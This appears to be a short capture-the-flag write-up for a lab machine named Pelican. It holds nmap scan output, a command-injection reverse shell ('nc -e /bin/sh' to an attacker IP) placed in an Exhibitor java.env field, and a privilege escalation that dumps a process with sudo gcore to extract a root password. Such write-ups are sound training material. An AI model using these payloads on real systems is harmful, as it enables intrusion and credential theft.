<img width="978" height="115" alt="image" src="https://github.com/user-attachments/assets/8ec1d2c0-b0f8-4191-b95c-f404e53a85ea" /># Nmap 7.95 scan initiated Wed Jul  8 04:23:37 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sV -sC -v -oN nmap_sVsC.txt 192.168.164.98
Nmap scan report for 192.168.164.98
Host is up (0.043s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp  open  ipp         CUPS 2.2
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Forbidden - CUPS v2.2.10
2222/tcp open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
8080/tcp open  http        Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
8081/tcp open  http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://192.168.164.98:8080/exhibitor/v1/ui/index.html
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-07-08T08:23:50
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2026-07-08T04:23:52-04:00
|_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 0s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul  8 04:23:56 2026 -- 1 IP address (1 host up) scanned in 18.94 seconds

port 8081 shows a zookeeper exhibitor website
<img width="1920" height="608" alt="image" src="https://github.com/user-attachments/assets/f9e3d855-1135-40ca-ae9a-867cb926a87a" />
https://www.exploit-db.com/exploits/48654

$(/bin/nc -e /bin/sh 192.168.45.187 4444 &)
Add this into the java.env script and commit all at once to get to the reverse shell.

when running ps aux, pid 513 stands out
<img width="1186" height="52" alt="image" src="https://github.com/user-attachments/assets/d5cc802f-a305-4f2b-bacc-e2bcd03c7012" />

sudo -l allows us to use gcore which lets us read pids
<img width="978" height="115" alt="image" src="https://github.com/user-attachments/assets/b732b06a-4554-4dc8-8855-d55d3392e5a7" 

sudo gcore 513
strings core.513
password is retrieved "ClogKingpinInning731"

login to root using password




